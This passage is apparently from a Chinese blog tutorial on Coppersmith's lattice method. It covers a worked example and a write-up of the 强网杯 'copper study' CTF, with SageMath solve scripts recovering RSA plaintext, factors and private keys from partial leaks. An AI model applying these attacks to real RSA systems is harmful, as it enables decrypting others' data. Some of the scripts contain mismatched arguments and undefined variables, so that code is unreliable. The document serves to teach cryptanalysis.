1，从而有$\sqrt{dh}2^{\frac{dh-1}{4}}M^{\frac{h-1}{2}}X^{\frac{dh-1}{2}}&lt;M^{h-1}$,</p><p>&emsp;&emsp;变形一下为：$\sqrt{dh}2^{\frac{dh-1}{4}}X^{\frac{dh-1}{2}}&lt;M^{\frac{h-1}{2}}$</p><p>&emsp;&emsp;这里我们换元一下，设$c(d,h)=(\sqrt{dh}2^{\frac{dh-1}{4}})^{\frac{2}{h-1}}=\sqrt2(dh)^{\frac{1}{dh-1}}$，那么我们有$c(d,h)X&lt;M^{\frac{h-1}{dh-1}}$</p><p>&emsp;&emsp;注意到${\frac{h-1}{dh-1}}=\frac{1}{d}-\frac{d-1}{d(dh-1)}$,我们设$\epsilon = \frac{d-1}{d(dh-1)}$，那么有$h=\frac{\frac{d-1}{d \epsilon}+1}{d}≈\frac{1}{d\epsilon}$,并且$dh=\frac{d-1}{d \epsilon}+1$，所以$c(d,h)=\sqrt2(\frac{d-1}{d \epsilon}+1)^{\frac{d\epsilon}{d-1}}$,当$\epsilon $趋向于0时，$c(d,h)$趋向于$\sqrt2$，</p><p>&emsp;&emsp;因为之前我们有$c(d,h)X&lt;M^{\frac{h-1}{dh-1}}$，用上$\epsilon$就是$c(d,h)X&lt;M^{\frac{1}{d}-\epsilon}$，所以这里咱如果想要达到Coppersmith定理的那个效果，那么我们需要$c(d,h)≤2$，这里我们再次换元，设$\alpha=\frac{d\epsilon}{d-1}$，那么$c(d,h)=\sqrt2(\frac{1}{\alpha}+1)^\alpha$,所以我们要求$(\frac{1}{\alpha}+1)^\alpha≤\sqrt2$，因为$\epsilon = \frac{d-1}{d(dh-1)}≤ \frac{d-1}{d}$，所以$\alpha≤1$，所以解得$0≤\alpha≤0.18$，</p><p>&emsp;&emsp;结合上面提到的：$0&lt;\epsilon &lt;min{0.18,\frac{1}{d}} $，由于$0≤\alpha=\frac{d\epsilon}{d-1}≤0.18$，并且$\frac{1}{d}-\epsilon &gt;0$，所以当$d&gt;5$时，$\epsilon &lt; \frac{1}{d}$,当$0&lt;d≤5,\epsilon&lt;0.18$，</p><p>&emsp;&emsp;运行LLL算法用时肯定是跟格的维度，格里面数值大小有关的，又由$h=\frac{\frac{d-1}{d \epsilon}+1}{d}≈\frac{1}{d\epsilon}$,所以格L的维度$dh≈\frac{1}{\epsilon}$，所以时间复杂度与$d,\frac{1}{\epsilon},log(M)$有关。这里也有一个结论就是，Coppersmith‘s Method的一个大致的时间复杂读为$O((\frac{1}{\epsilon})^9log(M)^3)$，</p><h5 id="example-3"><a href="#example-3" class="headerlink" title="example 3"></a>example 3</h5><p>&emsp;&emsp;设$p=2^{30}+3,q=2^{32}+15,M=pq$</p><p>&emsp;&emsp;$F(x)=a_0+a_1x+a_2x^2+a_3x^3=1942528644709637042 + 1234567890123456789x + 987654321987654321x^2 + x^3$</p><p>&emsp;&emsp;并且我们事先知道根:$|x_0|≤2^{14}$，所以我们设$X=2^{14}$，注意到$X≈M^{\frac{1}{4.4}}$。这里我们构造格$L = \begin{bmatrix} M^2&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0 \newline 0&amp;M^2X&amp;0&amp;0&amp;0&amp;0&amp;0 \newline  0&amp;0&amp;M^2X^{2}&amp;0&amp;0&amp;0&amp;0 \newline Ma_0 &amp;Ma_1X&amp;Ma_2X^2&amp;MX^3&amp;0&amp;0&amp;0 \newline 0&amp;Ma_0X&amp;Ma_1X^2&amp;Ma_2X^3&amp;MX^4&amp;0&amp;0 \newline  0&amp;0&amp;Ma_0X^{2}&amp;Ma_1X^3&amp;Ma_2X^4&amp;MX^5 &amp;0\newline a_0^2&amp;2_0a_1X&amp;(a_1^2+2a_0a_2)X^2&amp;(2a_0+2a_1a_2)X^3&amp;(a_2^2+2a_1)X^4&amp;2a_2X^5&amp;X^6\end{bmatrix}$</p><p>&emsp;&emsp;注意到，我们这里并没有像proof中的那样，加上所有的$G _ {i,j}(x)$，这里我们只添加量两条“x-shift” polynomial，额外添加了一条$F(X)^2$，第四行为$MF(X)$。理论上我们还可以针对$F(X)^2$再添加两条“x-shift” polynomial，但这里并没有这么做，是综合考虑了到$x_0$的上界X，和LLL算法运行的时间复杂度。所以这里格的维度是7，行列式$det(L)=M^9X^{21}$。</p><p>&emsp;&emsp;这里运行LLL算法，并将第一行的行向量的相应X值去除得到系数向量，可得$G(x)=-369928294330603367352173305173409792 + 88565517701781911148679362207202x<br>-3439987357258441728608570659x^2 + 446358057645551896819258x^3<br>+4564259979987386926x^4 - 1728007960413053x^5 - 21177681998x^6$</p><p>运算求根算法可得$x_0=16384$</p><p>&emsp;&emsp;到这里，我们对于单元Coppersmith’s Method的原理学习就告一段落了。至于最初说的$x_0$的取值上界可以达到$M^{\frac{1}{d}-\epsilon}$，而为啥最后我们证明出来的是却是$\frac{1}{2}M^{\frac{1}{d}-\epsilon}$。从Coppersmith 定理的证明过程来看，应该是与$\alpha$的取值范围有关。</p><h2 id="实例-第三届强网杯之copper-study"><a href="#实例-第三届强网杯之copper-study" class="headerlink" title="实例-第三届强网杯之copper study"></a>实例-第三届强网杯之copper study</h2><h3 id="第一关：Stereotyped-messages"><a href="#第一关：Stereotyped-messages" class="headerlink" title="第一关：Stereotyped messages"></a>第一关：Stereotyped messages</h3><p>已知n,e=3,c，m共512bit但是低72bit未知，原理可参考<a href="https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch19.pdf" target="_blank" rel="noopener">Mathematics of Public Key Cryptography ch19</a>。也即前文所述。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">1</span></span><br><span class="line">[+]n=<span class="number">0x44e360ce873d18d33eecc0829eb0801e71950e26576963c470f91f4c5e7f3e951f65404c6a87f4328495c9c64d39271f3317081aeab34bdf350c5f9bf0c5a49668f763cbf404e66f210336042c6a6e43eed6c6eaca69287ed91b2841148668fd3881b241317574cc8b307fb41593ff7caaa6f09e32f657399c63fe5f68995c5dL</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x20d40eecc8108d6c57b0ea2e1d7d165fb342813764f3760baf71e7929e3c22476de15b5e665ff8b869b5ed3a672aad4e9ef330bb7e18329ce2d0cccae369e244002882a273d3bf5a13b8936974768a920f5cbee52d0bb0323f867ff6305c5aa7ceb99453172332cd9837fdb05d6ea2d7eac39fd0d39960dc9ddbdd40f82b444bL</span></span><br><span class="line">[+]((m&gt;&gt;<span class="number">72</span>)&lt;&lt;<span class="number">72</span>)=<span class="number">0x5377a12cada023e2714b4a9e80f1da87ca567f084e2862e704b813cd7f69b8dbbf67d60e73610fabb7896eeb3cc5a2c0915d03f9f8d44d000000000000000000L</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>这道题我们完全可以将题面转化为在求方程$f(x) = (m+x)^3$ 在模N下的解</p><p>所以可以直接套我们前面所描述的方法</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 展示格的样式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(B, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(B.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(B.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> B[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> B[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="keyword">print</span> (a)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith</span><span class="params">(pol, modulus, h, X)</span>:</span></span><br><span class="line">    <span class="comment"># 计算矩阵维度</span></span><br><span class="line">    n = d * h</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将多项式转到整数环上</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造上文所述lattice，polZ(x * X) 就是环上的多项式f(X * x)，所以这里与上文不同的点就在于引入了变量x，但变量x在后面的矩阵构造中会被抹掉。</span></span><br><span class="line">    g = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(d):</span><br><span class="line">            g.append((x * X)**j * modulus**(h - <span class="number">1</span> - i) * polZ(x * X)**i)</span><br><span class="line">            </span><br><span class="line">    B = Matrix(ZZ, n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</span><br><span class="line">            B[i, j] = g[i][j]</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># 展示格的样式</span></span><br><span class="line">matrix_overview(B,modulus^h)</span><br><span class="line">    <span class="comment"># LLL算法</span></span><br><span class="line">    B = B.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将最短向量转化为多项式，并且去除相应的X</span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        new_pol += x**i * B[<span class="number">0</span>, i] / X**i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解方程</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line">    <span class="keyword">return</span> potential_roots</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N =</span><br><span class="line">e =</span><br><span class="line">c =</span><br><span class="line">m =</span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">f = (m + x)^e - c</span><br><span class="line">epsilon = <span class="number">1</span> / <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据公式计算参数d、h、X</span></span><br><span class="line">d = f.degree()</span><br><span class="line">h = ceil(<span class="number">1</span> / (d * epsilon)) </span><br><span class="line">X = ceil(N**((<span class="number">1</span>/d) - epsilon))</span><br><span class="line"></span><br><span class="line">roots = (coppersmith(f, N, d, h, X))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    <span class="keyword">if</span> (m + root)^e %N  == c %N :</span><br><span class="line">        print(m + root)</span><br></pre></td></tr></table></figure><p>构造的格的样式</p><p><img src="https://i.loli.net/2020/08/09/ItTcgQlP9pSw3Jo.png" alt="image-20200809181945882"></p><p>与example3 是类似的</p><p>但其实sage已经集成了coppersmith的求根方法，因此简单调用一下函数就可以解决这个问题。这里之所以这样做其实是想映照前文，展示一下利用coppersmith来解决此类问题的整个过程。</p><p>利用现成方法版exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">N =</span><br><span class="line">e =</span><br><span class="line">c =</span><br><span class="line">m =</span><br><span class="line"></span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">f = (m + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># 这里的X选取不像上文用的是临界值，而是选了一个我们未知的x的最大可能值。X的选取并非严格，但至少得保证比临界值小。</span></span><br><span class="line">print(<span class="string">"m:"</span>, m + x0)</span><br></pre></td></tr></table></figure><p>BTW，这里泄露的是明文的高位，其实还有泄露低位、泄露高低位的情况。但换汤不换药，无非是由$m+x$变成了$ m_h +x * 2^k + m_l$。</p><h3 id="第二关：Factoring-with-high-bits-known"><a href="#第二关：Factoring-with-high-bits-known" class="headerlink" title="第二关：Factoring with high bits known"></a>第二关：Factoring with high bits known</h3><p>已知n,e,c，n=pq且已知p的高位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">2</span></span><br><span class="line">[+]n=<span class="number">0x5fe2743ec99568d645943147498849643932486590fb101f41c93ad7247161bc035d75dfb9e4b25209e26913098ecc1b7c4a92a47fb28452465d8b94e31844c4624da870140a48a28a0e6a3c6d9731b8488a63fd8ab9f5fe1ae86513c7444bb0aa39d44416b9cfa83c370f50c7a5a148a36823f0ddeed66ecf99117378c0640fL</span></span><br><span class="line">[+]e=<span class="number">65537</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x2639582bf7b22fd52a7a519673574e1212b675c9c10763ffcbcf5a86b61f07c4ea536e48dfbd4f3201cb2e18f2a0946959223b3f32bd5b3166d6cdd185ad946e543504dcc42ac9a24c03343bc8e4379997c722b12c66acaed6ad64d35f2fbcc8f4d899c1081d4211987841d1be082801a07014de89050b71e584827020934755L</span></span><br><span class="line">[+]((p&gt;&gt;<span class="number">128</span>)&lt;&lt;<span class="number">128</span>)=<span class="number">0xe4f16417011e6cc5ced2aad00d5865a0530f37c078dd22d942d0d0811c7053d973b621c4768a2a87a6d233be10db8e1a00000000000000000000000000000000L</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>这一关我们需要引入一个新的定理</p><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem 3"></a>Theorem 3</h4><p>设$N=p * q $并且有$p&lt;q&lt;2p$，设$0&lt;\epsilon&lt;\frac{1}{4}$，如果满足关系：$|p-p’|≤\frac{1}{2\sqrt2}N^{\frac{1}{4}-\epsilon}$，那么给定N和p’,我们就可以在与$log(N)$和$\frac{1}{\epsilon}$相关的时间复杂度内分解N。</p><p>这里我就不再给出令人头大的证明了。直接给出一个例子，但是显然，由于条件的改变，这个格子的构造也会与之前的格子不同。</p><h4 id="example-4"><a href="#example-4" class="headerlink" title="example 4"></a>example 4</h4><p>设$N=16803551，p’=2830 ， X=10.$</p><p>我们设$F(x)=(x+p’)$，并且考虑多项式：$N, F(x)，xF(x)=(x^2+p’x)，x^2F(x)$。然后构造格</p><p>$B = \begin{bmatrix} N&amp;0&amp;0&amp;0 \newline p’&amp;X&amp;0&amp;0 \newline  0&amp;p’X&amp;X^{2}&amp;0 \newline 0 &amp;0&amp;pX^2&amp;X^3\end{bmatrix}$</p><p>LLL规约后得到第一行的SVP为（105，-1200，800，1000），去除X可以得到</p><p>$G(x)=x^3+8x^2-120x+105$；解方程可以得到$x=7$，检查一下确实 $2387|N$</p><p>【这里的$N$也许显得突兀，把它看作是$k * p$也许会好理解些：所选取的多项式带入正解$x$时均在模$p$下与0同余。】</p><p>除了这样构造格子，通过查阅网上关于这道题的题解可以发现另一种格子的构造。我们这里是“x-shift”了三次，另外那种是先提升次数，然后再“x-shift”，具体用了这八个多项式：$N^4, N^3F(x), N^2F(x)^2,NF(x)^3,F(x)^4,xF(x)^4,x^2F(x)^4,x^3F(x)^4$</p><p>格子的样式：</p><p><img src="https://i.loli.net/2020/08/11/voZQpe9TkdKnRNm.png" alt="image-20200811225724892"></p><p>之所以这么选也是这里新引入了两个参数，一个是beta，一个是t，beta是未知p与已知N指数关系，这里就是0.4，因为$p≈N^{0.4}$，【其实可以是0.5，但我们并不确定$p,q$的大小关系，保险起见用0.4】t的具体取值与beta相关，另外这里的h的取值也与beta有关，X的取值也与上面的定理所述不同。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 展示格的样式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(B, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(B.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(B.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> B[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> B[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="keyword">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith</span><span class="params">(pol, modulus, beta, h, t, X)</span>:</span></span><br><span class="line">    <span class="comment"># 计算矩阵维度</span></span><br><span class="line">    n = d * h + t</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将多项式转到整数环上</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造上文所述lattice，polZ(x * X) 就是环上的多项式f(X * x)，所以这里与上文不同的点就在于引入了变量x，但变量x在后面的矩阵构造中会被抹掉。</span></span><br><span class="line">    g = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(d):</span><br><span class="line">            g.append((x * X)**j * modulus**(h - i) * polZ(x * X)**i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(t):</span><br><span class="line">        g.append((x * X)**i * polZ(x * X)**h)</span><br><span class="line">    <span class="comment"># 构造格B</span></span><br><span class="line">    B = Matrix(ZZ, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</span><br><span class="line">            B[i, j] = g[i][j]</span><br><span class="line">    <span class="comment"># 展示格的样式</span></span><br><span class="line">    matrix_overview(B, modulus^h)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    B = B.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将最短向量转化为多项式，并且去除相应的X </span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        new_pol += x**i * B[<span class="number">0</span>, i] / X**i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解方程</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查根</span></span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> potential_roots:</span><br><span class="line">        <span class="keyword">if</span> root[<span class="number">0</span>].is_integer():</span><br><span class="line">            result = polZ(ZZ(root[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">if</span> gcd(modulus, result) &gt;= modulus^beta:</span><br><span class="line">                print(<span class="string">"p: "</span>,(gcd(modulus, result)))</span><br><span class="line">                roots.append(ZZ(root[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">N = </span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">pbar = </span><br><span class="line">f = pbar + x</span><br><span class="line">beta = <span class="number">0.4</span></span><br><span class="line">d = f.degree()</span><br><span class="line">epsilon = beta / <span class="number">7</span></span><br><span class="line">h = ceil(beta**<span class="number">2</span> / (d * epsilon))</span><br><span class="line">t = floor(d * h * ((<span class="number">1</span>/beta) - <span class="number">1</span>))</span><br><span class="line">X = ceil(N**((beta**<span class="number">2</span>/d) - epsilon)) </span><br><span class="line">roots = coppersmith(f, N, beta, h, t, X)</span><br></pre></td></tr></table></figure><p>这个脚本其实也可以用在第一关，只要将beta改成1，再带入相应的多项式和数据就可以了。</p><p>相关的paper和原脚本在<a href="https://github.com/mimoo/RSA-and-LLL-attacks/" target="_blank" rel="noopener">github</a>，有兴趣的师傅可以研究研究。</p><p>同样，利用现成函数版exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">N = </span><br><span class="line">pbar = </span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">f = pbar + x</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p =  pbar + x0</span><br><span class="line">print(<span class="string">"p: "</span>, p)</span><br></pre></td></tr></table></figure><p>BTW，同第一关一样，这里的p泄露了高位，但与p泄露了低位的情况，无差。</p><h3 id="第三关：Partial-Key-Exposure-Attack"><a href="#第三关：Partial-Key-Exposure-Attack" class="headerlink" title="第三关：Partial Key Exposure Attack"></a>第三关：Partial Key Exposure Attack</h3><p>已知n,e=3,c，d的低512bit已知 【n的长度为1023】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">3</span></span><br><span class="line">[+]n=<span class="number">0x6f209521a941ddde2294745f53711ae6a7a59aa4d0735f47328ac03e26a4e092bb1c4c885029950f52b1e071597dc6e6d5129afbdb4688ad0479d6f9655dafef915da0a3f5114989cb474a13a9a4a4293fd447739b3cc2b0a3966f21617f057e6c199c5fd4d11ce78fdf9112f53446578b6cfd2c405eb0d3389cd3965636f719L</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x6126eaf34233341016966d50c54c6f7401e98f2015bcbdc4d56f93f0c48590fcd8ee784521c503be322c0848f998dc3a6d630bc1043a4162467c4b069b6c0e186061ed2187d0b2d44e9797ce62569d2dab58d183d69b9d110369a8d690361b22223e34e65e51868646d0ebf697b10e21a97d028833719e87c1584d2564f21167L</span></span><br><span class="line">[+]d=invmod(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">[+]d&amp;((<span class="number">1</span>&lt;&lt;<span class="number">512</span>)<span class="number">-1</span>)=<span class="number">0x1d8f1499c4f6d90716d89f76833823e8fca4dd4034f17157e4fd9f6f070e1526f3b4fa3fe507d645ec848e4d7ff3728eb8df04b72849feabaa3425f9fc510ec3L</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>根据RSA相关参数我们可以知道的是$e * d = k\phi(n)+1$，</p><p>我们设 $s = p + q$，</p><p>则有$e *d = k(n-s+1)+1$。</p><p>再设$d$的低位为$d_0$ ，与$n^{\frac{1}{2}}$约为一个bit长度级别,</p><p>设n的bit长度为$L$，由$e *d = k(n-s+1)+1$我们很容易能得到</p><p>$e * d_0 \equiv k(n-s+1)+1 \pmod{2^{\frac{L}{2}}}$     ①，</p><p>接下来的操作可能有点跳跃：这里我们想消元，把上式的s给消去，又因为我们有</p><p>$p^2-sp+n = p^2-p^2-pq+n=0$    ②</p><p>$p * ①-k * ②=ed_0p\equiv kpn-kps+kp+p-kp^2+kps-kn\equiv kpn + kp+p-kp^2-kn \pmod{2^{\frac{L}{2}}}$</p><p>这样式子就只有一个未知数$p$了，即解同余式方程：</p><p>$ed_0x\equiv  knx + kx+x-kx^2-kn \pmod{2^{\frac{L}{2}}}$ </p><p>我们就可以得到$p$的低位$p_0$了。</p><p>不对，我们似乎漏了$k$的值，但是由最初的$e*d = k\phi(n)+1$我们可以知道，$d&lt;\phi(n)$，那肯定有$k&lt;e$，而这里$e=3$，所以爆这个$k$就完事。</p><p>然后我们再用第二关的脚本，梭他就完事。</p><p>exp源自</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_p</span><span class="params">(p0, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    p0bits = p0.nbits()</span><br><span class="line">    f = <span class="number">2</span>^p0bits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-p0bits), beta=<span class="number">0.4</span>)  </span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^d0bits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p0</span><span class="params">(d0, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span 